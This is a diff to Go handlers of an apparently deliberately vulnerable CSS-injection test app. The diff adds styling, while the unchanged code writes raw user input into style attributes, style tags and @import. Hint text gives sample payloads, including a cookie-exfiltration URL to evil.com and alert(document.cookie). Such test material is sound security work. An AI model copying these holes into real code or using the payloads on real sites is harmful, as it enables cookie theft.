@@ -31,11 +31,15 @@ func inline(w http.ResponseWriter, r *http.Request) {
 	// VULNERABLE: User input in inline style
 	fmt.Fprintf(w, `<!DOCTYPE html>
 <html>
-<head><title>CSS Injection - Inline</title></head>
+<head>
+<title>CSS Injection - Inline</title>
+<link rel="stylesheet" href="/static/css/hive.css">
+</head>
 <body>
+<div class="container">
 <h1>CSS Injection - Inline Style</h1>
 <form method="GET">
-    <input name="color" value="%s" placeholder="Color" style="width:300px">
+    <input name="color" value="%s" placeholder="Color">
     <button type="submit">Apply</button>
 </form>
 <h2>Result:</h2>
@@ -46,6 +50,7 @@ func inline(w http.ResponseWriter, r *http.Request) {
 <p><small>Try: blue; background: url('http://evil.com/steal?cookie='+document.cookie)</small></p>
 <p><small>Or: blue; } body { background: red } .x {</small></p>
 <p><a href="/vulns/injection/css/">Back to CSS Tests</a></p>
+</div>
 </body></html>`, color, color)
 }
 
@@ -62,6 +67,7 @@ func styleTag(w http.ResponseWriter, r *http.Request) {
 <html>
 <head>
 <title>CSS Injection - Style Tag</title>
+<link rel="stylesheet" href="/static/css/hive.css">
 <style>
 %s {
     color: red;
@@ -70,9 +76,10 @@ func styleTag(w http.ResponseWriter, r *http.Request) {
 </style>
 </head>
 <body>
+<div class="container">
 <h1>CSS Injection - Style Tag</h1>
 <form method="GET">
-    <input name="selector" value="%s" placeholder="CSS Selector" style="width:300px">
+    <input name="selector" value="%s" placeholder="CSS Selector">
     <button type="submit">Apply</button>
 </form>
 <h2>Applied Style:</h2>
@@ -82,6 +89,7 @@ func styleTag(w http.ResponseWriter, r *http.Request) {
 <h3>Hint:</h3>
 <p><small>Try: h1 { } body { background: url('http://evil.com/'); } h2</small></p>
 <p><a href="/vulns/injection/css/">Back to CSS Tests</a></p>
+</div>
 </body></html>`, selector, selector, selector)
 }
 
@@ -98,14 +106,16 @@ func importCSS(w http.ResponseWriter, r *http.Request) {
 <html>
 <head>
 <title>CSS Injection - Import</title>
+<link rel="stylesheet" href="/static/css/hive.css">
 <style>
 @import url('%s');
 </style>
 </head>
 <body>
+<div class="container">
 <h1>CSS Injection - CSS Import</h1>
 <form method="GET">
-    <input name="url" value="%s" placeholder="CSS URL" style="width:400px">
+    <input name="url" value="%s" placeholder="CSS URL">
     <button type="submit">Import</button>
 </form>
 <h2>Imported CSS:</h2>
@@ -114,6 +124,7 @@ func importCSS(w http.ResponseWriter, r *http.Request) {
 <p><small>Try: http://evil.com/malicious.css</small></p>
 <p><small>Attacker-controlled CSS can exfiltrate data using attribute selectors</small></p>
 <p><a href="/vulns/injection/css/">Back to CSS Tests</a></p>
+</div>
 </body></html>`, url, url, url)
 }
 
@@ -130,6 +141,7 @@ func expression(w http.ResponseWriter, r *http.Request) {
 <html>
 <head>
 <title>CSS Injection - Expression</title>
+<link rel="stylesheet" href="/static/css/hive.css">
 <style>
 .dynamic {
     width: expression(%s);
@@ -138,9 +150,10 @@ func expression(w http.ResponseWriter, r *http.Request) {
 </style>
 </head>
 <body>
+<div class="container">
 <h1>CSS Injection - CSS Expression (Legacy IE)</h1>
 <form method="GET">
-    <input name="value" value="%s" placeholder="Expression value" style="width:400px">
+    <input name="value" value="%s" placeholder="Expression value">
     <button type="submit">Apply</button>
 </form>
 <h2>Applied Style:</h2>
@@ -150,6 +163,7 @@ func expression(w http.ResponseWriter, r *http.Request) {
 <p><small>Try: alert(document.cookie) (works in legacy IE)</small></p>
 <p><small>CSS expressions were removed in IE8+ standards mode</small></p>
 <p><a href="/vulns/injection/css/">Back to CSS Tests</a></p>
+</div>
 </body></html>`, value, value, value)
 }
 
@@ -179,11 +193,15 @@ func fpSanitized(w http.ResponseWriter, r *http.Request) {
 
 	fmt.Fprintf(w, `<!DOCTYPE html>
 <html>
-<head><title>CSS Injection - Safe</title></head>
+<head>
+<title>CSS Injection - Safe</title>
+<link rel="stylesheet" href="/static/css/hive.css">
+</head>
 <body>
+<div class="container">
 <h1>CSS Injection - Safe (Sanitized)</h1>
 <form method="GET">
-    <input name="color" value="%s" placeholder="Color" style="width:300px">
+    <input name="color" value="%s" placeholder="Color">
     <button type="submit">Apply</button>
 </form>
 <h2>Result:</h2>
@@ -194,5 +212,6 @@ func fpSanitized(w http.ResponseWriter, r *http.Request) {
 <p><small>SAFE: Only whitelisted color names and valid hex codes allowed</small></p>
 <p><small>Allowed: red, blue, green, black, white, yellow, orange, purple, #RGB, #RRGGBB</small></p>
 <p><a href="/vulns/injection/css/">Back to CSS Tests</a></p>
+</div>
 </body></html>`, color, safeColor)
 }
